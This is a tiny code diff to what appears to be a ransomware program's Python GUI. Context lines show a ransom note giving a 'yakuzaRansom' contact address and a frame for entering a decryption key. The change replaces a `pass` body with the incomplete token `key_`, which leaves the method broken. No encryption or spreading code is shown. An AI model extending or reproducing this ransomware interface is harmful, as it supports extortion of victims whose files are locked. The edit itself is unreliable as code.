@@ -101,7 +101,7 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
 
     def setup_key_frame(self):
         """ this function Setting UP the Frame for the Decryption Key Input """
-        pass
+        key_
 
     def setup_log_frame(self):
         pass
